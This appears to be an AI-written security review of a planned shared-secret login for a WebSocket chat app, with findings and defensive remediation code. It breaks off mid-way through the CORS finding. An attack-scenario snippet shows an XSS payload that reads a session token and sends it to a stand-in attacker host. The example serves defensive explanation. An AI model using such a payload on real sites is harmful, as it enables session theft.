# Security Review Report: I2-001 Secret Dialog Authentication

**Task**: I2-001 - Temporary Authentication via Shared Secret
**Date**: 2026-05-14
**Analyst**: Security Engineer Agent
**Status**: Pre-Implementation Security Review

## Executive Summary

This security review analyzes the planned temporary authentication mechanism for iteration I2-001. The implementation introduces authentication via a shared secret dialog, session tokens stored in localStorage, and in-memory session management without database persistence.

**Overall Risk Assessment**: **HIGH** - This is a temporary authentication mechanism with significant security limitations. It is acceptable for development/internal use only, but requires substantial security hardening before any production deployment.

## Scope Classification

| Finding | Classification | Action |
|---------|---------------|--------|
| Hardcoded/shared secret authentication | Blocking | Must address before implementation |
| localStorage token storage | Blocking | Must implement mitigation |
| Session token cryptographic strength | Related | Implement during I2-001 |
| WebSocket authentication | Related | Implement during I2-001 |
| Brute force protection | Related | Implement during I2-001 |
| Session hijacking mitigation | Related | Implement during I2-001 |
| Token expiration | Related | Implement during I2-001 |

---

## Critical Findings (CVSS 9.0-10.0)

### CRITICAL-1: Hardcoded/Shared Secret Exposure

**OWASP Category**: A07:2025 - Authentication Failures
**STRIDE**: Spoofing, Elevation of Privilege
**CVSS Score**: 9.8 (Critical)

**Description**: The task specifies "hardcoded or env-based secret validation" for authentication. Hardcoded secrets in source code are a critical security vulnerability. Environment variables, while better, still present risks if not properly managed.

**Impact**:
- Secret exposed in source code repository
- All users share same authentication credential
- No audit trail of who authenticated
- Cannot revoke individual user access
- Cannot rotate secret without disrupting all users
- If secret is compromised, entire system is compromised

**Current State** (from `app/__init__.py`):
```python
@server.socketio.on("connect")
async def on_connect(sid: str, environ: dict, auth: dict | None) -> bool:
  # Connection limit check
  if len(connected_clients) >= MAX_CLIENTS:
    server.logger.warning(f"Rejecting connection {sid}: server at capacity")
    return False
  
  # No authentication in I1-001 - all connections accepted
  # Future iterations will add auth validation here
  connected_clients.add(sid)
  return True
```

**Remediation**:
1. **Never hardcode secrets in source code**. Use environment variables with secure management:
   ```python
   import os
   from dotenv import load_dotenv

   load_dotenv()

   # Use environment variable with strong default validation
   AUTH_SECRET = os.environ.get("AUTH_SECRET")
   if not AUTH_SECRET:
     raise ValueError("AUTH_SECRET environment variable must be set")
   ```

2. **Implement per-user secrets** (even for temporary auth):
   ```python
   # Support multiple secrets for different users
   AUTH_SECRETS = os.environ.get("AUTH_SECRETS", "").split(",")
   if not AUTH_SECRETS or not all(AUTH_SECRETS):
     raise ValueError("AUTH_SECRETS must contain at least one valid secret")

   def validate_secret(provided_secret: str) -> bool:
     # Use constant-time comparison to prevent timing attacks
     import secrets
     return any(
       secrets.compare_digest(provided_secret, valid_secret)
       for valid_secret in AUTH_SECRETS
     )
   ```

3. **Log authentication attempts** without exposing secrets:
   ```python
   server.logger.info(f"Authentication attempt from IP {client_ip}: {'success' if valid else 'failed'}")
   ```

4. **Implement rate limiting** immediately:
   ```python
   from collections import defaultdict
   from datetime import datetime, timedelta

   auth_attempts = defaultdict(list)

   def check_rate_limit(client_ip: str) -> bool:
     now = datetime.utcnow()
     attempts = auth_attempts[client_ip]
     # Keep only attempts from last 15 minutes
     recent_attempts = [a for a in attempts if now - a < timedelta(minutes=15)]
     auth_attempts[client_ip] = recent_attempts
     return len(recent_attempts) < 5  # Max 5 attempts per 15 minutes
   ```

5. **Add `.env` to `.gitignore`** immediately:
   ```
   # .gitignore
   .env
   .env.local
   .env.*.local
   secrets/
   ```

**Reference**:
- [OWASP A07:2025 - Authentication Failures](https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [NIST SP 800-63B Section 5.1.1.2](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

### CRITICAL-2: localStorage Token Storage Vulnerabilities

**OWASP Category**: A05:2025 - Injection, A01:2025 - Broken Access Control
**STRIDE**: Information Disclosure, Tampering
**CVSS Score**: 9.1 (Critical)

**Description**: Storing session tokens in localStorage exposes them to multiple attack vectors. localStorage is accessible to any JavaScript running on the same origin, making it vulnerable to XSS attacks.

**Impact**:
- XSS vulnerability in any component can steal authentication tokens
- Token persists across sessions (no automatic expiration on browser close)
- Accessible to malicious browser extensions
- Cannot implement HttpOnly flag
- Vulnerable to DOM-based XSS
- No protection against malicious scripts in dependencies

**Attack Scenarios**:
```javascript
// Attacker with XSS can steal token:
const token = localStorage.getItem('session_token');
fetch('https://attacker.com/steal?token=' + token);

// DOM-based XSS example:
// If application renders user input unsafely
<div>${userInput}</div>  <!-- If userInput contains script -->
```

**Remediation**:

**Option 1: Use httpOnly Cookies (Recommended for Production)**:
```python
# Server-side: Set httpOnly cookie
from quart import make_response
import secrets

@app.route('/auth/login', methods=['POST'])
async def login():
  # Validate secret
  # ...

  token = secrets.token_urlsafe(32)  # Generate secure token
  response = await make_response({'status': 'success'})

  # Secure cookie settings
  response.set_cookie(
    'session_token',
    token,
    httponly=True,      # Not accessible via JavaScript
    secure=True,        # Only sent over HTTPS
    samesite='Strict',  # CSRF protection
    max_age=3600        # 1 hour expiration
  )
  return response
```

**Option 2: In-Memory Token with Short Lifetime (For I2-001)**:
If localStorage is required for I2-001 temporary implementation:

```javascript
// Mitigation strategies for localStorage storage:

// 1. Encrypt token before storage (client-side)
const CryptoJS = require('crypto-js');

function storeToken(token) {
  // Use a key derived from user input or session-specific data
  const key = deriveKeyFromSession();  // Not stored in localStorage
  const encrypted = CryptoJS.AES.encrypt(token, key).toString();
  localStorage.setItem('session_token_encrypted', encrypted);
}

// 2. Implement token rotation
let tokenExpiry = null;
function isTokenValid() {
  return tokenExpiry && Date.now() < tokenExpiry;
}

// 3. Clear on logout and page unload
window.addEventListener('beforeunload', () => {
  // Consider: should token persist? If not, clear here
});

// 4. Implement Content Security Policy
// Add to HTML template:
// <meta http-equiv="Content-Security-Policy"
//       content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net">
```

**Option 3: Hybrid Approach for I2-001**:
```javascript
// Store only a session identifier, not the full token
// Full token kept in closure/sessionStorage (more restrictive than localStorage)

const sessionManager = {
  sessionId: null,
  tokenExpiry: null,

  authenticate(secret, displayName) {
    return fetch('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ secret, display_name: displayName })
    })
    .then(res => res.json())
    .then(data => {
      this.sessionId = data.session_id;
      this.tokenExpiry = Date.now() + (15 * 60 * 1000); // 15 minutes
      // Store minimal info in localStorage
      localStorage.setItem('session_id', data.session_id);
      localStorage.setItem('session_expiry', this.tokenExpiry.toString());
    });
  },

  getToken() {
    if (!this.tokenExpiry || Date.now() > this.tokenExpiry) {
      this.clear();
      return null;
    }
    return this.sessionId;
  },

  clear() {
    this.sessionId = null;
    this.tokenExpiry = null;
    localStorage.removeItem('session_id');
    localStorage.removeItem('session_expiry');
  }
};
```

**Reference**:
- [OWASP A05:2025 - Security Misconfiguration](https://owasp.org/Top10/A05_2025-Security_Misconfiguration/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-939: Improper Authorization in Handler for Custom Endpoint](https://cwe.mitre.org/data/definitions/939.html)

---

## High Findings (CVSS 7.0-8.9)

### HIGH-1: Weak Session Token Generation

**OWASP Category**: A04:2025 - Cryptographic Failures
**STRIDE**: Spoofing
**CVSS Score**: 8.1 (High)

**Description**: The task does not specify cryptographic requirements for token generation. Weak tokens can be predicted, brute-forced, or collided.

**Impact**:
- Predictable tokens allow session hijacking
- Insufficient entropy leads to token collisions
- Attackers can guess valid tokens
- Session fixation attacks possible

**Remediation**:

```python
import secrets
import hashlib
from datetime import datetime, timedelta

class SessionManager:
  """Secure session token management."""

  def __init__(self):
    self.sessions = {}  # In-memory for I2-001

  def generate_token(self) -> str:
    """Generate cryptographically secure session token.

    Requirements:
    - Minimum 128 bits of entropy (OWASP recommendation)
    - Use cryptographically secure random number generator
    - No predictable patterns
    """
    # secrets.token_urlsafe provides 32 bytes (256 bits) of entropy
    # Base64 URL-safe encoding results in 43-character string
    return secrets.token_urlsafe(32)

  def create_session(self, display_name: str, client_ip: str) -> dict:
    """Create new authenticated session."""

    # Generate secure token
    token = self.generate_token()

    # Store token hash (never store plain token if possible)
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    session = {
      'token_hash': token_hash,
      'display_name': display_name,
      'client_ip': client_ip,
      'created_at': datetime.utcnow(),
      'expires_at': datetime.utcnow() + timedelta(hours=1),
      'last_activity': datetime.utcnow()
    }

    # Map token hash to session data
    self.sessions[token_hash] = session

    return {
      'token': token,  # Return plain token only on creation
      'session_id': token_hash[:16],  # Safe to expose
      'expires_at': session['expires_at'].isoformat()
    }

  def validate_token(self, token: str) -> dict | None:
    """Validate session token."""

    if not token:
      return None

    # Hash the provided token
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    session = self.sessions.get(token_hash)

    if not session:
      return None

    # Check expiration
    if datetime.utcnow() > session['expires_at']:
      del self.sessions[token_hash]
      return None

    # Update last activity
    session['last_activity'] = datetime.utcnow()

    return session

  def revoke_session(self, token: str) -> bool:
    """Revoke/invalidate session."""

    token_hash = hashlib.sha256(token.encode()).hexdigest()
    if token_hash in self.sessions:
      del self.sessions[token_hash]
      return True
    return False
```

**Token Security Requirements**:
- Minimum 128 bits of entropy (256+ recommended)
- Use `secrets` module, not `random` module
- Never use sequential or predictable tokens
- Never store plain tokens (store hash only)
- Implement token expiration (short for I2-001)
- Log token creation/validation (without exposing token value)

**Reference**:
- [OWASP A04:2025 - Cryptographic Failures](https://owasp.org/Top10/A04_2025-Cryptographic_Failures/)
- [OWASP Session Management Cheat Sheet - Token Quality](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-entropy)
- [NIST SP 800-57 Part 1 Rev. 5](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

---

### HIGH-2: Missing WebSocket Authentication

**OWASP Category**: A01:2025 - Broken Access Control
**STRIDE**: Elevation of Privilege
**CVSS Score**: 8.6 (High)

**Description**: Current implementation (I1-001) accepts all WebSocket connections without authentication. I2-001 must add authentication to the WebSocket handshake and message handlers.

**Current Vulnerable Code** (from `app/__init__.py`):
```python
@server.socketio.on("connect")
async def on_connect(sid: str, environ: dict, auth: dict | None) -> bool:
  """
  Handle new client connection.

  No authentication in I1-001 - all connections accepted.
  Future iterations will add auth validation here.
  """
  if len(connected_clients) >= MAX_CLIENTS:
    server.logger.warning(f"Rejecting connection {sid}: server at capacity")
    return False

  connected_clients.add(sid)
  server.logger.info(f"Client connected: {sid} (total: {len(connected_clients)})")

  # Broadcast user joined - BUT WHO? No authentication!
  await server.socketio.emit("user_joined", {
    "sid": sid,
    "timestamp": datetime.utcnow().isoformat()
  }, skip_sid=sid)

  return True
```

**Impact**:
- Anyone can connect to WebSocket without credentials
- Messages can be sent without authentication
- No way to identify malicious users
- Session hijacking enables impersonation
- No accountability for actions

**Remediation**:

```python
# WebSocket authentication handler
@server.socketio.on("connect")
async def on_connect(sid: str, environ: dict, auth: dict | None) -> bool:
  """
  Handle new client connection with authentication.

  I2-001: Validate session token before accepting connection.
  """

  # Step 1: Validate authentication data exists
  if not auth or 'token' not in auth:
    server.logger.warning(f"Rejecting connection {sid}: missing authentication")
    return False

  # Step 2: Validate token
  token = auth['token']
  session = session_manager.validate_token(token)

  if not session:
    server.logger.warning(f"Rejecting connection {sid}: invalid or expired token")
    return False

  # Step 3: Validate client IP matches session (optional but recommended)
  client_ip = environ.get('REMOTE_ADDR', '')
  if session.get('client_ip') != client_ip:
    server.logger.warning(
      f"Rejecting connection {sid}: IP mismatch "
      f"(session: {session.get('client_ip')}, connection: {client_ip})"
    )
    return False

  # Step 4: Connection limit check
  if len(connected_clients) >= MAX_CLIENTS:
    server.logger.warning(f"Rejecting connection {sid}: server at capacity")
    return False

  # Step 5: Register authenticated connection
  connected_clients[sid] = {
    'session': session,
    'ip': client_ip,
    'connected_at': datetime.utcnow()
  }

  server.logger.info(
    f"Client connected: {sid} as '{session['display_name']}' "
    f"(total: {len(connected_clients)})"
  )

  # Step 6: Broadcast with authenticated user info
  await server.socketio.emit("user_joined", {
    "sid": sid,
    "user": session['display_name'],
    "timestamp": datetime.utcnow().isoformat()
  }, skip_sid=sid)

  return True


# Message handler with authentication
@server.socketio.on("message")
async def on_message(sid: str, data: dict) -> dict:
  """
  Receive message from authenticated client and broadcast.

  I2-001: Include user identification in broadcast.
  """

  # Validate session exists
  if sid not in connected_clients:
    server.logger.warning(f"Message from unauthenticated client: {sid}")
    return {"error": "Not authenticated", "code": 401}

  session_data = connected_clients[sid]

  # Validate message structure
  if not isinstance(data, dict):
    return {"error": "Invalid message format", "code": 400}

  content = data.get("content")
  if not content or not isinstance(content, str):
    return {"error": "Missing or invalid 'content' field", "code": 400}

  # Sanitize content
  content = html.escape(content.strip())[:MAX_MESSAGE_LENGTH]

  # Create broadcast message with user identification
  message = {
    "id": str(uuid.uuid4()),
    "sid": sid,
    "user": session_data['session']['display_name'],  # Now we have user info!
    "content": content,
    "timestamp": datetime.utcnow().isoformat()
  }

  # Broadcast to all clients
  await server.socketio.emit("message", message)

  server.logger.debug(f"Message from {session_data['session']['display_name']}: {content[:50]}")

  return {
    "status": "ok",
    "message_id": message["id"],
    "timestamp": message["timestamp"]
  }
```

**Frontend Authentication**:
```javascript
// In chat.js - authenticate before connecting
async function authenticate(secret, displayName) {
  try {
    const response = await fetch('/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ secret, display_name: displayName })
    });

    if (!response.ok) {
      throw new Error('Authentication failed');
    }

    const data = await response.json();
    localStorage.setItem('session_token', data.token);
    localStorage.setItem('session_expiry', data.expires_at);

    return data.token;
  } catch (error) {
    console.error('Authentication error:', error);
    throw error;
  }
}

// Connect with authentication
function connectWithAuth(token) {
  socket.auth = { token: token };
  socket.connect();
}

// On page load
const token = localStorage.getItem('session_token');
const expiry = localStorage.getItem('session_expiry');

if (token && expiry && Date.now() < new Date(expiry).getTime()) {
  // Resume existing session
  connectWithAuth(token);
} else {
  // Show authentication dialog
  showAuthDialog();
}
```

**Reference**:
- [OWASP A01:2025 - Broken Access Control](https://owasp.org/Top10/A01_2025-Broken_Access_Control/)
- [OWASP Web Security Testing Guide - WebSocket Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets)
- [Socket.IO Authentication Documentation](https://socket.io/docs/v4/middlewares/)

---

### HIGH-3: Brute Force Attack Vulnerability

**OWASP Category**: A07:2025 - Authentication Failures
**STRIDE**: Spoofing
**CVSS Score**: 7.5 (High)

**Description**: No protection against brute force attacks on the shared secret. An attacker can make unlimited authentication attempts.

**Impact**:
- Attackers can try unlimited secrets
- Shared secret can be brute-forced
- No lockout mechanism
- No progressive delays
- Resource exhaustion possible

**Remediation**:

```python
from collections import defaultdict
from datetime import datetime, timedelta
import time

class RateLimiter:
  """Rate limiter for authentication attempts."""

  def __init__(self, max_attempts: int = 5, window_minutes: int = 15, lockout_minutes: int = 30):
    self.max_attempts = max_attempts
    self.window = timedelta(minutes=window_minutes)
    self.lockout = timedelta(minutes=lockout_minutes)
    self.attempts = defaultdict(list)  # IP -> list of timestamps
    self.lockouts = {}  # IP -> lockout expiry time

  def is_allowed(self, client_ip: str) -> tuple[bool, str]:
    """Check if client is allowed to attempt authentication.

    Returns:
      (allowed: bool, message: str)
    """
    now = datetime.utcnow()

    # Check if client is locked out
    if client_ip in self.lockouts:
      lockout_expiry = self.lockouts[client_ip]
      if now < lockout_expiry:
        remaining = (lockout_expiry - now).total_seconds()
        return False, f"Account locked. Try again in {int(remaining)} seconds."
      else:
        # Lockout expired
        del self.lockouts[client_ip]

    # Clean old attempts
    self.attempts[client_ip] = [
      ts for ts in self.attempts[client_ip]
      if now - ts < self.window
    ]

    # Check attempt count
    if len(self.attempts[client_ip]) >= self.max_attempts:
      # Apply lockout
      self.lockouts[client_ip] = now + self.lockout
      return False, f"Too many failed attempts. Locked for {self.lockout.seconds // 60} minutes."

    return True, "OK"

  def record_attempt(self, client_ip: str, success: bool):
    """Record authentication attempt."""

    now = datetime.utcnow()

    if success:
      # Clear attempts on successful authentication
      self.attempts[client_ip] = []
      if client_ip in self.lockouts:
        del self.lockouts[client_ip]
    else:
      # Record failed attempt
      self.attempts[client_ip].append(now)

  def get_remaining_attempts(self, client_ip: str) -> int:
    """Get number of remaining attempts before lockout."""
    return max(0, self.max_attempts - len(self.attempts[client_ip]))


# Global rate limiter instance
auth_rate_limiter = RateLimiter(
  max_attempts=5,
  window_minutes=15,
  lockout_minutes=30
)


# Authentication endpoint with rate limiting
@app.route('/auth/login', methods=['POST'])
async def login():
  """Authenticate with shared secret."""

  # Get client IP
  client_ip = request.remote_addr

  # Check rate limit
  allowed, message = auth_rate_limiter.is_allowed(client_ip)
  if not allowed:
    return jsonify({'error': message}), 429  # Too Many Requests

  # Parse request
  data = await request.get_json()
  secret = data.get('secret')
  display_name = data.get('display_name')

  # Validate inputs
  if not secret or not display_name:
    return jsonify({'error': 'Missing secret or display_name'}), 400

  if len(display_name) > 50:
    return jsonify({'error': 'Display name too long'}), 400

  # Validate secret
  valid = validate_secret(secret)

  # Record attempt
  auth_rate_limiter.record_attempt(client_ip, valid)

  if not valid:
    remaining = auth_rate_limiter.get_remaining_attempts(client_ip)
    server.logger.warning(f"Failed authentication from {client_ip}")
    return jsonify({
      'error': 'Invalid secret',
      'remaining_attempts': remaining
    }), 401

  # Create session
  session = session_manager.create_session(display_name, client_ip)

  server.logger.info(f"Successful authentication: {display_name} from {client_ip}")

  return jsonify({
    'token': session['token'],
    'session_id': session['session_id'],
    'expires_at': session['expires_at']
  })
```

**Additional Protections**:

1. **Progressive Delays**:
```python
# Add exponential backoff per failed attempt
class ProgressiveRateLimiter(RateLimiter):
  def get_delay(self, client_ip: str) -> float:
    """Get delay before next attempt allowed."""
    attempts = len(self.attempts[client_ip])
    return min(2 ** attempts, 300)  # Exponential up to 5 minutes
```

2. **Captcha After Failures**:
```javascript
// Show captcha after 2 failed attempts
let failedAttempts = 0;

async function login(secret, displayName, captcha) {
  const body = { secret, display_name: displayName };
  if (failedAttempts >= 2) {
    if (!captcha) {
      showCaptcha();
      return;
    }
    body.captcha = captcha;
  }
  // ... submit
}
```

3. **Monitoring and Alerting**:
```python
# Alert on suspicious patterns
if len(auth_rate_limiter.attempts[client_ip]) >= 3:
  server.logger.warning(
    f"Suspicious activity: {client_ip} has {len(auth_rate_limiter.attempts[client_ip])} "
    f"failed attempts in last {auth_rate_limiter.window.seconds // 60} minutes"
  )
```

**Reference**:
- [OWASP A07:2025 - Authentication Failures](https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Rate Limiting Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)

---

## Medium Findings (CVSS 4.0-6.9)

### MEDIUM-1: Session Token Expiration Not Implemented

**OWASP Category**: A07:2025 - Authentication Failures
**STRIDE**: Spoofing
**CVSS Score**: 6.5 (Medium)

**Description**: No session expiration mechanism specified. Tokens without expiration remain valid indefinitely.

**Impact**:
- Stolen tokens remain valid forever
- No automatic cleanup of inactive sessions
- Sessions never expire
- Memory leak (in-memory sessions accumulate)

**Remediation**:

```python
from datetime import datetime, timedelta

class SessionManager:
  def __init__(self, session_timeout_minutes: int = 60):
    self.sessions = {}
    self.session_timeout = timedelta(minutes=session_timeout_minutes)

  def validate_token(self, token: str) -> dict | None:
    """Validate session token with expiration check."""
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    session = self.sessions.get(token_hash)

    if not session:
      return None

    # Check expiration
    now = datetime.utcnow()
    if now > session['expires_at']:
      # Clean up expired session
      del self.sessions[token_hash]
      server.logger.info(f"Session expired: {session['display_name']}")
      return None

    # Check inactivity timeout (optional)
    inactivity_timeout = timedelta(minutes=30)
    if now - session['last_activity'] > inactivity_timeout:
      del self.sessions[token_hash]
      server.logger.info(f"Session timed out due to inactivity: {session['display_name']}")
      return None

    # Update last activity
    session['last_activity'] = now
    return session

  def cleanup_expired_sessions(self):
    """Remove all expired sessions (call periodically)."""
    now = datetime.utcnow()
    expired = [
      token_hash for token_hash, session in self.sessions.items()
      if now > session['expires_at']
    ]

    for token_hash in expired:
      del self.sessions[token_hash]

    if expired:
      server.logger.info(f"Cleaned up {len(expired)} expired sessions")

# Schedule cleanup (e.g., every 5 minutes)
import asyncio

async def session_cleanup_task():
  """Background task to clean up expired sessions."""
  while True:
    await asyncio.sleep(300)  # 5 minutes
    session_manager.cleanup_expired_sessions()

# Start cleanup task
asyncio.create_task(session_cleanup_task())
```

**Recommended Session Policies for I2-001**:
- Absolute timeout: 1 hour from creation
- Inactivity timeout: 30 minutes of no activity
- Cleanup interval: Every 5 minutes
- Maximum sessions per user: 1 (for temporary auth)

**Reference**:
- [OWASP A07:2025 - Authentication Failures](https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration)

---

### MEDIUM-2: No Token Rotation or Refresh Mechanism

**OWASP Category**: A07:2025 - Authentication Failures
**STRIDE**: Spoofing, Tampering
**CVSS Score**: 5.9 (Medium)

**Description**: No mechanism to rotate or refresh session tokens. Long-lived tokens without rotation increase exposure window.

**Impact**:
- Compromised token remains valid for entire session
- No way to extend session without creating new token
- Token theft has long impact window
- Cannot implement "remember me" safely

**Remediation**:

```python
class SessionManager:
  def refresh_token(self, old_token: str) -> dict | None:
    """Refresh session token (token rotation).

    Creates new token, invalidates old one.
    Returns new token if session is valid.
    """
    # Validate old token
    session = self.validate_token(old_token)
    if not session:
      return None

    old_token_hash = hashlib.sha256(old_token.encode()).hexdigest()

    # Generate new token
    new_token = secrets.token_urlsafe(32)
    new_token_hash = hashlib.sha256(new_token.encode()).hexdigest()

    # Create new session with same data but new token
    session['token_hash'] = new_token_hash
    session['expires_at'] = datetime.utcnow() + timedelta(hours=1)
    session['last_activity'] = datetime.utcnow()

    # Remove old token, add new
    del self.sessions[old_token_hash]
    self.sessions[new_token_hash] = session

    return {
      'token': new_token,
      'session_id': new_token_hash[:16],
      'expires_at': session['expires_at'].isoformat()
    }


# Endpoint for token refresh
@app.route('/auth/refresh', methods=['POST'])
async def refresh_token():
  """Refresh session token."""

  # Get current token from header or body
  token = request.headers.get('Authorization', '').replace('Bearer ', '')
  if not token:
    data = await request.get_json()
    token = data.get('token')

  if not token:
    return jsonify({'error': 'Missing token'}), 401

  # Refresh token
  new_session = session_manager.refresh_token(token)

  if not new_session:
    return jsonify({'error': 'Invalid or expired token'}), 401

  return jsonify(new_session)
```

**Frontend Token Refresh**:
```javascript
// Automatic token refresh before expiry
class TokenManager {
  constructor() {
    this.token = localStorage.getItem('session_token');
    this.expiry = localStorage.getItem('session_expiry');
    this.refreshTimer = null;
  }

  scheduleRefresh() {
    if (!this.expiry) return;

    const expiryTime = new Date(this.expiry).getTime();
    const now = Date.now();
    const timeUntilExpiry = expiryTime - now;

    // Refresh 5 minutes before expiry
    const refreshTime = timeUntilExpiry - (5 * 60 * 1000);

    if (refreshTime > 0) {
      this.refreshTimer = setTimeout(() => this.refresh(), refreshTime);
    }
  }

  async refresh() {
    try {
      const response = await fetch('/auth/refresh', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.token}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        this.token = data.token;
        this.expiry = data.expires_at;
        localStorage.setItem('session_token', this.token);
        localStorage.setItem('session_expiry', this.expiry);
        this.scheduleRefresh();
      } else {
        // Token invalid, redirect to login
        this.clear();
        window.location.href = '/';
      }
    } catch (error) {
      console.error('Token refresh failed:', error);
    }
  }

  clear() {
    this.token = null;
    this.expiry = null;
    if (this.refreshTimer) {
      clearTimeout(this.refreshTimer);
    }
    localStorage.removeItem('session_token');
    localStorage.removeItem('session_expiry');
  }
}
```

**Reference**:
- [OWASP A07:2025 - Authentication Failures](https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/)
- [OAuth 2.0 Token Rotation Best Practice](https://www.oauth.com/oauth2-servers/token-introspection/)

---

### MEDIUM-3: Missing Session Hijacking Protection

**OWASP Category**: A01:2025 - Broken Access Control
**STRIDE**: Spoofing
**CVSS Score**: 6.1 (Medium)

**Description**: No protection against session hijacking. Tokens can be stolen and used from any location.

**Impact**:
- Stolen tokens work from any IP
- No detection of token theft
- Cannot invalidate specific sessions
- Session fixation attacks possible

**Remediation**:

```python
class SessionManager:
  def create_session(self, display_name: str, client_ip: str, user_agent: str) -> dict:
    """Create session with additional fingerprinting."""

    token = secrets.token_urlsafe(32)
    token_hash = hashlib.sha256(token.encode()).hexdigest()

    session = {
      'token_hash': token_hash,
      'display_name': display_name,
      'client_ip': client_ip,
      'user_agent_hash': hashlib.sha256(user_agent.encode()).hexdigest(),
      'created_at': datetime.utcnow(),
      'expires_at': datetime.utcnow() + timedelta(hours=1),
      'last_activity': datetime.utcnow(),
      'last_ip': client_ip
    }

    self.sessions[token_hash] = session

    return {
      'token': token,
      'session_id': token_hash[:16],
      'expires_at': session['expires_at'].isoformat()
    }

  def validate_session_context(self, session: dict, client_ip: str, user_agent: str) -> bool:
    """Validate session context matches original request.

    Detects potential session hijacking.
    """
    # Check IP (configurable - can be strict or lenient)
    if session['client_ip'] != client_ip:
      # IP mismatch - could be legitimate (mobile network switching)
      # Log but don't reject
      server.logger.warning(
        f"IP change for session {session['display_name']}: "
        f"{session['client_ip']} -> {client_ip}"
      )
      # Optionally: reject strict IP binding
      # return False

    # Check user agent
    current_ua_hash = hashlib.sha256(user_agent.encode()).hexdigest()
    if session.get('user_agent_hash') != current_ua_hash:
      server.logger.warning(
        f"User agent change for session {session['display_name']}"
      )
      # User agent change is suspicious
      return False

    return True


# In WebSocket connection handler
@server.socketio.on("connect")
async def on_connect(sid: str, environ: dict, auth: dict | None) -> bool:
  # ... existing validation ...

  session = session_manager.validate_token(token)
  if not session:
    return False

  # Validate session context
  client_ip = environ.get('REMOTE_ADDR', '')
  user_agent = environ.get('HTTP_USER_AGENT', '')

  if not session_manager.validate_session_context(session, client_ip, user_agent):
    server.logger.warning(
      f"Session context mismatch for {session['display_name']} from {client_ip}"
    )
    return False

  # ... continue with connection ...
```

**Additional Protections**:

1. **Session Binding**:
```python
# Bind session to WebSocket connection
connected_sessions = {}  # token_hash -> sid

def bind_session(token_hash: str, sid: str) -> bool:
  """Bind session to specific WebSocket connection.

  Prevents multiple connections with same token.
  """
  if token_hash in connected_sessions:
    # Already connected - reject or disconnect old
    old_sid = connected_sessions[token_hash]
    server.logger.info(f"Disconnecting old session {old_sid}")
    # Optionally: disconnect old session
    # await server.socketio.disconnect(old_sid)
    return False

  connected_sessions[token_hash] = sid
  return True
```

2. **Logout/Revocation**:
```python
@app.route('/auth/logout', methods=['POST'])
async def logout():
  """Invalidate session."""

  token = request.headers.get('Authorization', '').replace('Bearer ', '')
  if not token:
    return jsonify({'error': 'Missing token'}), 401

  success = session_manager.revoke_session(token)

  return jsonify({'status': 'logged_out' if success else 'not_found'})
```

**Reference**:
- [OWASP A01:2025 - Broken Access Control](https://owasp.org/Top10/A01_2025-Broken_Access_Control/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-hijacking)

---

## Low Findings (CVSS 0.1-3.9)

### LOW-1: Missing Content Security Policy

**OWASP Category**: A05:2025 - Security Misconfiguration
**STRIDE**: Tampering
**CVSS Score**: 3.5 (Low)

**Description**: No Content Security Policy (CSP) configured. CSP helps prevent XSS attacks.

**Impact**:
- Easier to exploit XSS vulnerabilities
- Third-party scripts can execute without restriction
- Inline scripts allowed by default
- Data exfiltration easier

**Remediation**:

```python
# Add CSP headers to Quart app
from quart import Quart, make_response

@app.after_request
async def add_security_headers(response):
  """Add security headers to all responses."""

  # Content Security Policy
  response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self' https://cdn.jsdelivr.net; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
    "font-src 'self' https://fonts.gstatic.com; "
    "img-src 'self' data:; "
    "connect-src 'self' wss: ws:; "  # WebSocket connections
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self';"
  )

  # Other security headers
  response.headers['X-Content-Type-Options'] = 'nosniff'
  response.headers['X-Frame-Options'] = 'DENY'
  response.headers['X-XSS-Protection'] = '1; mode=block'
  response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
  response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'

  return response
```

**Reference**:
- [OWASP A05:2025 - Security Misconfiguration](https://owasp.org/Top10/A05_2025-Security_Misconfiguration/)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

---

### LOW-2: Missing CORS Configuration

**OWASP Category**: A05:2025 - Security Misconfiguration
**STRIDE**: Information Disclosure, Tampering
**CVSS Score**: 3.1 (Low)

**Description**: Current implementation uses `cors_allowed_origins='*'` (from `api-broadcast.md`). This allows any origin to connect.

**Impact**:
- Any website can make requests to your API
- CSRF attacks easier
- Data exfiltration possible
- WebSocket hijacking from other origins

**Remediation**:

```python
# Configure CORS for specific origins
from quart_cors import cors

# For development
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'http://localhost:8000').split(',')

app = Quart(__name__)
